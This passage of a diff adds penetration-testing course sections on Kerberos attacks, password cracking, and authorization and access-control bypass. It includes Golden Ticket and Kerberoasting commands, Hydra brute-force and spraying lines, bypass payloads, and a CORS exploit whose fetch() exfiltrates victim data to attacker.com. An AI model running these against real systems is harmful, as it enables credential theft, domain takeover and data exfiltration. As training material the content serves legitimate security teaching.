+ticketer.py -nthash KRBTGT_NTLM_HASH \
+  -domain-sid S-1-5-21-xxxxxxxx-xxxxxxxx-xxxxxxxx \
+  -domain corp.local \
+  Administrator
+
+# The ticket is valid for 10 years by default (duration configurable)
+# Using the ticket:
+export KRB5CCNAME=Administrator.ccache
+smbclient.py -k -no-pass corp.local/Administrator@DC01.corp.local
+
+# Mimikatz Golden Ticket (Windows):
+kerberos::golden /user:Administrator \
+  /domain:corp.local \
+  /sid:S-1-5-21-... \
+  /krbtgt:KRBTGT_NTLM_HASH \
+  /ptt
+```
+
+#### Attack 6 — Kerberos Delegation Abuse
+
+**Unconstrained Delegation:**
+Active Directory allows certain computers and service accounts to impersonate users for Kerberos authentication — called delegation. In "unconstrained delegation," the machine stores the user's full TGT in memory when they authenticate to it. An attacker who compromises a machine with unconstrained delegation enabled can extract all TGTs from that machine's memory using Mimikatz and use them to authenticate to any service on the domain as any user who connected to that machine.
+
+Identifying unconstrained delegation:
+```bash
+# PowerView:
+Get-DomainComputer -Unconstrained | Select-Object Name, DNSHostName
+
+# LDAP query:
+ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" \
+  "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(name=KRBTGT))(!(name=DC)))" \
+  name
+```
+
+**Constrained Delegation:**
+More controlled than unconstrained — the service can only delegate to specific listed services. Still abusable if an attacker compromises an account with constrained delegation configured.
+
+#### Detection Event IDs — What Defenders Look For
+
+| Attack | Key Event ID | What Triggers It |
+|--------|------------|-----------------|
+| Kerberoasting | 4769 | TGS requested with RC4 encryption (etype 0x17) |
+| AS-REP Roasting | 4768 | TGT requested where pre-auth disabled |
+| Golden Ticket | 4769, 4672 | TGS request — but suspicious (no preceding AS-REQ, or very long validity) |
+| Silver Ticket | (nothing at DC) | DC is never contacted — detected only at endpoint level |
+| DCSync | 4662 | DS-Replication-Get-Changes-All accessed from non-DC machine |
+
+The hardest to detect is the Silver Ticket — because the Domain Controller is never involved in ticket validation, no DC logs are generated. Detection requires endpoint telemetry from the service host, comparing service logons with expected behavior.
+
+---
+
+### 6.5.7 Practice — Kerberos Attack Execution
+
+#### Lab Environment Setup
+
+Kerberos attacks require a Windows Active Directory environment. The most accessible options for lab practice:
+
+**Option 1 — GOAD (Game of Active Directory):**
+[https://github.com/Orange-Cyberdefense/GOAD](https://github.com/Orange-Cyberdefense/GOAD)
+
+GOAD deploys a complete multi-domain Active Directory environment with intentional misconfigurations using Vagrant and VirtualBox/VMware. It takes approximately 2-4 hours to deploy but provides a realistic enterprise AD environment for practicing all Kerberos attacks.
+
+**Option 2 — VulnAD:**
+[https://github.com/WazeHell/vulnerable-AD](https://github.com/WazeHell/vulnerable-AD)
+
+A PowerShell script that deploys a vulnerable Active Directory on Windows Server. Faster to set up than GOAD if you already have a Windows Server VM.
+
+**Option 3 — HackTheBox and TryHackMe:**
+Both platforms have Windows Active Directory machines and rooms specifically for practicing Kerberoasting, AS-REP Roasting, and ticket attacks. No local infrastructure needed.
+
+#### Complete Kerberoasting Practice Sequence
+
+```bash
+# Step 1: Enumerate SPNs (from Kali with domain credentials)
+GetUserSPNs.py corp.local/lowprivuser:password -dc-ip 192.168.1.10
+
+# Output shows accounts with SPNs registered:
+# ServicePrincipalName         Name      MemberOf  PasswordLastSet
+# CIFS/filesvr.corp.local      svc_fs    ...        2020-01-15
+# MSSQLSvc/sqlsvr.corp.local   svc_sql   ...        2019-06-20
+
+# Step 2: Request tickets and save to file
+GetUserSPNs.py corp.local/lowprivuser:password -dc-ip 192.168.1.10 -request -outputfile hashes.txt
+
+# Step 3: Examine hash format (should match hashcat mode 13100):
+cat hashes.txt
+# $krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sqlsvr.corp.local*$...
+
+# Step 4: Crack with hashcat
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --show
+
+# Step 5: Once cracked, test access
+# If svc_sql password = 'Summer2023!':
+smbclient.py corp.local/svc_sql:'Summer2023!'@sqlsvr.corp.local
+secretsdump.py corp.local/svc_sql:'Summer2023!'@sqlsvr.corp.local
+```
+
+---
+
+### 6.5.8 Lab — Using Password Tools
+
+#### The Complete Password Attack Toolkit
+
+This lab consolidates password-focused authentication attacks using the professional tool set.
+
+**Hydra — Network Service Brute Force:**
+
+Hydra is the primary tool for brute forcing network authentication services — SSH, FTP, HTTP login forms, SMTP, RDP, MySQL, and many others.
+
+```bash
+# SSH brute force (after confirming it's in scope):
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target
+
+# HTTP POST form brute force:
+# First, capture a failed login in Burp to see the form parameters
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target \
+  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+# HTTP basic authentication:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /admin/
+
+# FTP:
+hydra -L users.txt -P passwords.txt ftp://target
+
+# MySQL:
+hydra -l root -P /usr/share/wordlists/rockyou.txt target mysql
+
+# RDP:
+hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://target
+
+# Multiple hosts:
+hydra -l admin -P passwords.txt -M hosts.txt ssh
+
+# Rate limiting / stealth options:
+hydra -l admin -P passwords.txt -t 1 -W 3 ssh://target
+# -t 1: one thread (slow but stealthy)
+# -W 3: wait 3 seconds between attempts
+```
+
+**Medusa — Alternative Brute Force Tool:**
+
+```bash
+# SMTP user enumeration and brute force:
+medusa -h target -U users.txt -P passwords.txt -M smtp
+
+# HTTP form:
+medusa -h target -U users.txt -P passwords.txt -M http -m FORM:/login
+```
+
+**Password Spraying — Avoiding Lockout:**
+
+Unlike brute force (many passwords per account), password spraying tests one or few passwords against many accounts. This avoids triggering account lockout thresholds.
+
+```bash
+# Microsoft 365 / Azure AD password spray:
+# MSOLSpray (specific for O365):
+Invoke-MSOLSpray -UserList users.txt -Password 'Summer2024!'
+
+# TREVORspray (with IP rotation for larger campaigns):
+trevorspray -t targets.txt --use-proxy-file proxies.txt -p 'Summer2024!'
+
+# General web form spray with Hydra (one password, many users):
+hydra -L users.txt -p 'Password123' target http-post-form "/login:user=^USER^&pass=^PASS^:failed"
+```
+
+**Hashcat — Offline Hash Cracking:**
+
+```bash
+# Identify hash type first:
+hashid hash.txt           # hashid tool
+hash-identifier           # interactive tool
+
+# Common hash modes:
+# 0: MD5
+# 100: SHA1
+# 1000: NTLM
+# 1800: SHA-512crypt (Linux shadow file)
+# 3200: bcrypt
+# 5500: NTLMv1
+# 5600: NTLMv2 (Responder captures)
+# 13100: Kerberos 5 TGS-REP (Kerberoasting)
+# 18200: Kerberos 5 AS-REP (AS-REP Roasting)
+# 16500: JWT HS256
+
+# Dictionary attack:
+hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Rules-based attack (most effective for real passwords):
+hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+
+# Combination attack (combine two wordlists):
+hashcat -m 1000 ntlm_hashes.txt -a 1 wordlist1.txt wordlist2.txt
+
+# Mask attack (pattern-based — e.g., all passwords ending in 2024!):
+hashcat -m 1000 ntlm_hashes.txt -a 3 ?u?l?l?l?l2024!
+# ?u = uppercase, ?l = lowercase, ?d = digit, ?s = special
+
+# Prince attack (generates intelligent combinations):
+hashcat -m 1000 ntlm_hashes.txt -a 6 rockyou.txt ?d?d?d?d
+
+# Check cracked hashes:
+hashcat -m 1000 ntlm_hashes.txt --show
+```
+
+---
+
+## 6.6 Exploiting Authorization-Based Vulnerabilities
+
+### 6.6.1 Overview — What Authorization Means and Why It Fails
+
+Authorization is the system of rules that determines what an authenticated user is **permitted to do**. You have already proved who you are (authentication). Now the question is what you are allowed to access, modify, delete, or execute.
+
+Authorization failures are the most prevalent category of web application vulnerability. OWASP found authorization weaknesses in **94% of tested applications** — an incidence rate higher than any other vulnerability category. The reason is structural: authorization is fundamentally different from authentication in that it requires correct decisions at every single endpoint and every single resource, for every combination of user role and action. A single missed check creates a vulnerability.
+
+Authentication has relatively few places where it can fail — the login form, the session management, the MFA flow. Authorization potentially fails at every single API endpoint, every URL, every database query, every function. In a modern web application with hundreds of endpoints, each endpoint needs its own authorization check. Each check must correctly evaluate whether the requesting user's role and identity entitles them to perform the requested action on the requested resource. One missed check means an attacker who finds that endpoint can bypass the entire authorization system for that resource.
+
+**The most important distinction to internalize:**
+
+**Authentication** prevents unauthenticated access — it keeps strangers out of the building.
+
+**Authorization** prevents unauthorized actions by authenticated users — it prevents employees from accessing other employees' personnel files.
+
+Both are necessary. Neither is sufficient without the other.
+
+#### The Authorization Models
+
+Understanding authorization models is important because the model an application uses determines how it can fail.
+
+**RBAC — Role-Based Access Control:**
+Permissions are assigned to roles, and users are assigned to roles. A user in the "viewer" role can read records. A user in the "editor" role can read and write. A user in the "admin" role can read, write, and delete.
+
+RBAC fails when role assignments are incorrect (a user gets a role they should not have), when role checks are missing (a developer forgot to add the role check to a new endpoint), or when roles are too coarse-grained (all "editors" can edit all records, but they should only edit their own).
+
+**ABAC — Attribute-Based Access Control:**
+Access decisions are based on attributes of the user, the resource, and the environment. "User can access document if user.department == document.department AND document.classification <= user.clearance_level."
+
+ABAC is more flexible and precise than RBAC but harder to implement correctly. Failure modes often involve missing attribute checks or incorrect attribute comparisons.
+
+**DAC — Discretionary Access Control:**
+Resource owners control access to their resources. The creator of a file can grant access to others. Common in file systems and some web applications.
+
+DAC fails when ownership is not properly tracked or when the access control checks are missing, allowing non-owners to access resources.
+
+---
+
+### 6.6.2 IDOR — Insecure Direct Object Reference
+
+#### The Concept
+
+IDOR is the most frequently found authorization vulnerability in penetration testing and bug bounty programs. It occurs when an application uses a user-supplied identifier to access an object directly — a database record, a file, an account — without verifying that the requesting user is authorized to access that specific object.
+
+The "direct object reference" means the identifier directly maps to a storage object — a database row ID, a filename, a sequential record number. The "insecure" means this reference is used without access control verification.
+
+Imagine a healthcare portal where patients view their lab results. The URL structure is:
+```
+https://patient-portal.hospital.com/results?patient_id=10042
+```
+
+The application receives `patient_id=10042`, queries the database for that patient's results, and displays them. If the application does not verify that the authenticated user is patient 10042, any authenticated patient can view any other patient's results by changing the ID.
+
+This is IDOR. It is simple, it is extraordinarily common, and it can have catastrophic consequences. Healthcare, financial, legal, and HR systems contain among the most sensitive personal data that exists. A single IDOR in these systems can expose millions of records.
+
+#### IDOR Variations — Beyond Simple Numeric IDs
+
+**Sequential numeric IDs (the classic case):**
+```
+/api/orders/1042    → change to /api/orders/1043
+/profile?id=887     → change to /profile?id=888
+/invoice/00234      → change to /invoice/00235
+```
+
+**UUIDs and GUIDs:**
+Applications sometimes use UUIDs (Universally Unique Identifiers) like `550e8400-e29b-41d4-a716-446655440000` thinking their unpredictability provides access control. This is security through obscurity — if the UUID leaks anywhere (another API response, a log, a URL in an email), the protection is gone. Proper authorization checks are still required.
+
+**Indirect references — not IDs but other references:**
+Filenames: `/download?file=invoice_alice_2024.pdf` → `/download?file=invoice_bob_2024.pdf`
+Email addresses: `/account?email=alice@example.com` → `/account?email=bob@example.com`
+Hashed references: Hash the ID and use the hash as the reference — still IDOR if access control is missing
+
+**Parameter pollution — multiple values:**
+Some applications parse the first or last occurrence of a parameter. Sending:
+```
+?user_id=1042&user_id=1001
+```
+Might access user 1001's data if the server takes the last value, while the authorization check uses the first.
+
+**Mass Assignment / Auto-binding:**
+In frameworks that automatically bind request parameters to model objects (Ruby on Rails, ASP.NET MVC), submitting additional parameters that are not in the form but are valid model attributes may be accepted. If a form submits `name` and `email` but the model also has a `role` attribute, submitting `name=Alice&email=a@b.com&role=admin` might update the role if mass assignment protection is not in place.
+
+#### Finding IDOR — The Methodology
+
+IDOR discovery requires systematic enumeration and comparison. The core technique: identify every place the application exposes object identifiers, then test whether access control is enforced.
+
+**Step 1: Map all object identifiers**
+
+Browse the application thoroughly with Burp running. Look for:
+- Numeric IDs in URLs: `/users/1042`, `/orders/88`, `/documents/567`
+- IDs in query parameters: `?id=1042`, `?order_id=88`
+- IDs in POST bodies: `{"user_id": 1042, "action": "view"}`
+- IDs in JSON API responses (these are candidates for subsequent requests)
+- References in hidden form fields
+
+**Step 2: Create two test accounts**
+
+For proper IDOR testing, you need two accounts at the same privilege level (or sometimes different levels):
+- Account A: User A (your test account with known data)
+- Account B: User B (another test account)
+
+**Step 3: As User A, identify your object IDs**
+
+Log in as User A. Find your order ID, your profile ID, your document IDs. Note them.
+
+**Step 4: As User A, attempt to access User B's objects**
+
+Without logging out, change the ID in requests to point to User B's objects. If User A can read, modify, or delete User B's data, IDOR is confirmed.
+
+**Step 5: As User A, attempt to access admin-only objects**
+
+Try accessing IDs in ranges you would not expect to have access to. Try ID=1 (often an admin or first user). Try very low IDs (older records that might be admin-created). Try IDs from other parts of the application.
+
+**Tools:**
+
+```bash
+# Burp Suite Intruder — enumerate ID ranges:
+# 1. In Burp, send a request with an ID parameter to Intruder
+# 2. Mark the ID value as the payload position
+# 3. Set a number payload from 1 to 10000
+# 4. Look for responses with different sizes or status codes
+# 5. Different size = different data = potential IDOR
+
+# Burp Suite Autorize extension:
+# Install from BApp Store
+# 1. Log in as User A → configure Autorize with User B's session cookie
+# 2. Browse as User A
+# 3. Autorize automatically replays every request as User B
+# 4. Flags responses where User B gets the same data as User A (access control violation)
+# 5. Also flags where User B gets forbidden (correct behavior)
+# Color coding: Red = IDOR, Green = properly blocked
+```
+
+---
+
+### 6.6.3 Horizontal vs Vertical Privilege Escalation
+
+#### Horizontal Privilege Escalation
+
+Horizontal privilege escalation occurs when a user accesses resources belonging to another user at the **same privilege level**. Alice (a regular user) accesses Bob's (also a regular user) data.
+
+This is the classic IDOR scenario. Both users have the same permissions in terms of their role, but neither should access the other's data. The authorization check should verify not just "is this user authenticated and has the correct role" but "is this user the owner of this specific resource."
+
+The authorization question: "Does this user have permission to perform this action on THIS specific resource?"
+
+IDOR is horizontal privilege escalation. Finding another user's order, medical record, or private message by changing an ID in the URL is horizontal escalation.
+
+#### Vertical Privilege Escalation
+
+Vertical privilege escalation occurs when a user accesses resources or functions that require a **higher privilege level** than they have. A regular user accessing an administrator function is vertical escalation.
+
+This is frequently caused by missing function-level authorization checks — the administrator's functions exist at accessible endpoints but do not check whether the requesting user is an administrator.
+
+**The hidden button fallacy:**
+The admin panel link is only shown to admins in the navigation menu. But the admin endpoints (`/admin/users`, `/admin/config`, `/api/admin/delete`) exist and are accessible to anyone who knows the URL or finds them through enumeration. The application enforces authorization only at the UI level, not at the server level.
+
+**Discovering hidden admin endpoints:**
+
+```bash
+# Directory brute force targeting admin paths:
+gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -t 50 -x php,html,aspx,jsp,json
+
+# Targeted admin wordlist:
+gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt
+
+# Look for common admin paths:
+/admin
+/admin/users
+/admin/dashboard
+/management
+/manager
+/api/admin
+/api/v1/admin
+/internal
+/_admin
+/panel
+/cp (control panel)
+/wp-admin (WordPress)
+/administrator (Joomla)
+```
+
+**Testing the discovered endpoints:**
+For each discovered endpoint, test access with:
+- No authentication (logged out)
+- Regular user authentication
+- Premium user authentication (if applicable)
+- Admin authentication (if you have credentials)
+
+Any endpoint that a regular user should not access but does is vertical privilege escalation.
+
+**Parameter-based privilege escalation:**
+```
+# Modifying role parameters in requests:
+POST /api/profile/update
+{"name": "Alice", "email": "alice@example.com", "role": "admin"}
+
+# URL parameter role override:
+GET /dashboard?admin=true
+GET /api/user?privilege=superadmin
+
+# Hidden form field manipulation:
+# Find in HTML source:
+<input type="hidden" name="role" value="user">
+# Change to:
+<input type="hidden" name="role" value="admin">
+# (or intercept in Burp and modify)
+```
+
+---
+
+### 6.6.4 Access Control Bypass Techniques
+
+#### Technique 1 — HTTP Method Switching
+
+An authorization check might be implemented only for specific HTTP methods. The endpoint might block `GET /admin/users` for regular users but not check `POST /admin/users` or `PUT /admin/users`.
+
+```bash
+# In Burp Repeater, test each HTTP method against every sensitive endpoint:
+GET    /admin/users → 403 Forbidden
+POST   /admin/users → 200 OK (vulnerability!)
+PUT    /admin/users → 403 Forbidden
+DELETE /admin/users → 200 OK (vulnerability!)
+PATCH  /admin/users → 403 Forbidden
+HEAD   /admin/users → 200 OK (headers match a 200 response = data is there)
+OPTIONS /admin/users → 200 OK (reveals allowed methods)
+```
+
+#### Technique 2 — Path Traversal in Access Control
+
+Some authorization systems check the exact URL path. Variants of the path that resolve to the same resource may bypass the check:
+
+```
+# Original blocked:
+GET /admin/users → 403
+
+# Path variant bypasses:
+GET /ADMIN/users
+GET /admin/users/
+GET /admin//users
+GET /admin/./users
+GET /%61dmin/users  (URL encoded 'a')
+GET /admin%2fusers  (encoded slash)
+GET //admin/users
+
+# Rewrite rules: some frameworks treat these identically at the backend
+GET /admin;param/users   (path parameter injection)
+GET /admin/users?param
+GET /admin/.;/users
+```
+
+#### Technique 3 — X-Forwarded Headers for IP Bypass
+
+Applications that restrict admin access to specific IP addresses often check the `X-Forwarded-For` header — which is trivially forgeable by clients.
+
+```
+# Application blocks admin for non-internal IPs
+# But trusts X-Forwarded-For:
+GET /admin/users HTTP/1.1
+Host: target.com
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: localhost
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+
+# Or try internal IP ranges:
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 192.168.1.1
+X-Forwarded-For: 172.16.0.1
+```
+
+#### Technique 4 — Referrer Header Bypass
+
+Some applications check the `Referer` header to ensure requests come from within the application — an access control by origin. This is trivially bypassable by adding the expected Referer:
+
+```
+# Application only allows access to /admin if Referer is /admin/login:
+GET /admin/dashboard HTTP/1.1
+Host: target.com
+Referer: https://target.com/admin/login
+```
+
+#### Technique 5 — Cookie/Token Manipulation
+
+Authorization information stored in cookies or JWTs can be manipulated if improperly validated:
+
+```
+# JWT payload manipulation (if signature is not validated):
+# Original JWT payload: {"user": "alice", "role": "user"}
+# Manipulated: {"user": "alice", "role": "admin"}
+
+# Cookie-based role storage (insecure design):
+# Original: role=user
+# Manipulated: role=admin
+
+# Base64 encoded role (common insecure pattern):
+# Original: dXNlcg== (base64 for "user")
+# Decode: user
+# Re-encode "admin": YWRtaW4=
+# Swap in cookie: role=YWRtaW4=
+```
+
+#### Technique 6 — CORS Misconfiguration Exploitation
+
+CORS (Cross-Origin Resource Sharing) misconfigurations allow unauthorized cross-origin access to sensitive API endpoints.
+
+```javascript
+// Test if target.com reflects any Origin in CORS headers:
+// Send request with custom Origin:
+GET /api/sensitive-data HTTP/1.1
+Host: target.com
+Origin: https://attacker.com
+
+// Response indicating misconfiguration:
+Access-Control-Allow-Origin: https://attacker.com
+Access-Control-Allow-Credentials: true
+
+// If both are present: create a malicious page that makes authenticated
+// cross-origin requests to target.com and reads the responses:
+fetch('https://target.com/api/sensitive-data', {
+  credentials: 'include'  // sends victim's cookies
+}).then(r => r.json())
+  .then(data => {
+    // Exfiltrate data to attacker server
+    fetch('https://attacker.com/capture', {
+      method: 'POST',
+      body: JSON.stringify(data)
+    });
+  });
+```
+
+---
+
+### 6.6.5 The Complete Authorization Testing Methodology
+
+#### Before You Start — Build a Privilege Matrix
+
+The most effective way to test authorization is systematically. Before testing, build a matrix of:
+- Roles in the application (anonymous, user, premium, admin, superadmin)
+- Resources and actions (read profile, edit profile, delete profile, view all profiles, etc.)
+- Expected access for each role (should have / should not have)
+
+Then test each cell in the matrix: does the application actually enforce what the privilege matrix says should be enforced?
+
+#### The Automated Authorization Testing Workflow with Burp
+
+**Autorize extension** is the most efficient way to systematically test authorization:
+
+```
+Setup:
+1. Install Autorize from Burp BApp Store
+2. Log in as a high-privileged user (Admin) → capture and save the session headers
+3. Log in as a lower-privileged user (User) → capture and save these session headers  
+4. Configure Autorize with the lower-privileged session headers
+5. Log out and log in as Admin again (or keep Admin session)
+
+Testing:
+6. Browse the application as Admin — access all functions, all resources
+7. Autorize automatically replays every request with the User session
+8. Review Autorize's findings:
+   - Red: User got same/similar response as Admin → IDOR or privilege escalation
+   - Green: User got 403/401 or redirect → Access control working correctly
+   - Yellow: Inconclusive (different response but unclear if authorization enforced)
+```
+
+#### API-Specific Authorization Testing
+
+Modern applications expose REST or GraphQL APIs that require specific authorization testing approaches.
+
+**For REST APIs:**
+```bash
+# Test all discovered endpoints with different credential levels:
+# First, enumerate API endpoints from:
+# - JS files in browser
+# - Burp proxy history
+# - API documentation (/swagger, /api-docs, /redoc, /.well-known/)
+# - robots.txt, sitemap.xml
+
+# Test each endpoint with:
+# 1. No token (unauthenticated)
+curl -X GET https://target.com/api/v1/users
+
+# 2. Regular user token
+curl -X GET https://target.com/api/v1/users \
+  -H "Authorization: Bearer USER_TOKEN"
+
+# 3. Admin token (if available)
+curl -X GET https://target.com/api/v1/users \
+  -H "Authorization: Bearer ADMIN_TOKEN"
+
+# 4. Different user's token testing IDOR
+curl -X GET https://target.com/api/v1/users/1043 \
+  -H "Authorization: Bearer USER_A_TOKEN"
+# If User A can see User B's profile → IDOR
+```
+
+**For GraphQL APIs:**
+GraphQL requires special consideration because all queries go to a single endpoint.
+
+```bash
+# Introspection (reveals all available types and fields):
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ __schema { types { name fields { name } } } }"}'
+
+# Test queries that should require admin:
+curl -X POST https://target.com/graphql \
+  -H "Authorization: Bearer USER_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ allUsers { id email role passwordHash } }"}'
+
+# Tools for GraphQL security testing:
+# InQL (Burp extension): automated GraphQL schema analysis and attack surface mapping
+# GraphQL Cop: https://github.com/dolevf/graphql-cop
+```
+
+#### Documenting Authorization Findings Effectively
+
+Authorization findings require careful documentation because the business impact depends on what data or functions were accessed, not just whether access control failed abstractly.
+
+For each finding, document:
+1. The specific endpoint or resource where the finding was identified
+2. The user role that should not have access
+3. The exact HTTP request that demonstrated the bypass
+4. The HTTP response showing the unauthorized data or action
+5. The specific data or function exposed (be specific — "accessed order ID 88234 belonging to user alice@example.com")
+6. The business impact: what could a malicious actor do with this access?
+7. The reproduction steps: exact request sequence to demonstrate the finding
+
+A clear, well-documented authorization finding is one of the most impactful items in a penetration test report because it directly demonstrates business-relevant data exposure with concrete evidence.
+
+---
+
+*— Sections 6.5 and 6.6 are complete. Module 6 continues with Section 6.7: Understanding Cross-Site Scripting (XSS) Vulnerabilities. —*
+
+---
